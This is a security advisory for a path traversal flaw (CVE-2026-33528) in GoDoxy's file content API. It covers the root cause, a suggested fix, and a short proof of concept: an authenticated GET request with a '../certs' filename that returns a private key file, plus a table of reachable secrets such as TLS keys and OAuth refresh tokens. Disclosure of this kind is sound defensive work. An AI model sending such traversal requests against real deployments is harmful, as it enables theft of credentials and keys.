# [M] GoDoxy has a Path Traversal Vulnerability in its File API

## Summary
Severity: Medium
Advisory: GHSA-4753-cmc8-8j9v
CVE: CVE-2026-33528
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-24
Source: https://github.com/advisories/GHSA-4753-cmc8-8j9v
Type: github-advisory

## Affected
- Go: `github.com/yusing/godoxy` — affected >=0 <0.27.5

## Details
## Summary

The file content API endpoint at `/api/v1/file/content` is vulnerable to path traversal. The `filename` query parameter is passed directly to `path.Join(common.ConfigBasePath, filename)` where `ConfigBasePath = "config"` (a relative path). No sanitization or validation is applied beyond checking that the field is non-empty (`binding:"required"`).

An authenticated attacker can use `../` sequences to read or write files outside the intended `config/` directory, including TLS private keys, OAuth refresh tokens, and any file accessible to the container's UID.

## Root Cause

**File:** `internal/api/v1/file/get.go`, lines 68-73:

```go
func (t FileType) GetPath(filename string) string {
    if t == FileTypeMiddleware {
        return path.Join(common.MiddlewareComposeBasePath, filename)
    }
    return path.Join(common.ConfigBasePath, filename)
}
```

- `common.ConfigBasePath = "config"` — relative path, not absolute
- `path.Join("config", "../certs/key.pem")` normalizes to `"certs/key.pem"` — escaping `config/`
- No call to `strings.HasPrefix`, `filepath.Rel`, or any containment check exists
- The `format:"filename"` struct tag is an OpenAPI/Swagger annotation only, not enforced by the validator

## Proof of Concept

### Environment

- GoDoxy v0.27.4 (`ghcr.io/yusing/godoxy:latest`)
- Authentication enabled with default credentials (`admin`/`password`)

### Steps to Reproduce

**Step 1 — Authenticate:**

**Step 2 — Read file outside config/ via path traversal:**

```http
GET /api/v1/file/content?type=config&filename=../certs/secret-agent-key.pem HTTP/1.1
Host: localhost:8888
Cookie: godoxy_token=<JWT>
```

### HTTP Response

```
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 43
Content-Type: application/godoxy+yaml
Expires: 0
Pragma: no-cache

THIS_IS_A_SECRET_PRIVATE_KEY_FOR_AGENT_TLS
```
<img width="1489" height="286" alt="image" src="https://github.com/user-attachments/assets/05f3464f-20ba-4913-830d-9fcc2fa1a2e3" />

## Impact

### Files accessible via this vulnerability

| Path (relative to `config/`) | Contents | Risk |
|-------------------------------|----------|------|
| `../certs/agents/{host}.zip` | CA cert + server cert + **TLS private key** | Impersonate GoDoxy server to remote agents |
| `../data/oauth_refresh_tokens.json` | OIDC refresh tokens for all active sessions | Account takeover via token reuse |
| `../../etc/ssl/certs/ca-certificates.crt` | System CA certificates | Information disclosure |
| Any file readable by UID 1000 | Depends on mounted volumes | Variable |

The `PUT /api/v1/file/content` endpoint is also affected. While the content must pass YAML schema validation (config or provider format), an attacker can write valid provider YAML files outside `config/`, potentially injecting malicious route definitions.


## Suggested Remediation

Validate that the resolved path remains within the base directory:

```go
func (t FileType) GetPath(filename string) (string, error) {
    var base string
    if t == FileTypeMiddleware {
        base = common.MiddlewareComposeBasePath
    } else {
        base = common.ConfigBasePath
    }

    absBase, _ := filepath.Abs(base)
    resolved, _ := filepath.Abs(filepath.Join(base, filename))

    if !strings.HasPrefix(resolved, absBase+string(filepath.Separator)) {
        return "", fmt.Errorf("path traversal detected: %s", filename)
    }

    return resolved, nil
}
```

## References
- https://github.com/yusing/godoxy/security/advisories/GHSA-4753-cmc8-8j9v
- https://nvd.nist.gov/vuln/detail/CVE-2026-33528
- https://github.com/yusing/godoxy/commit/a541d75bb50f1b542c096d8bc8082c3549f5c059
- https://github.com/yusing/godoxy
- https://github.com/yusing/godoxy/releases/tag/v0.27.5
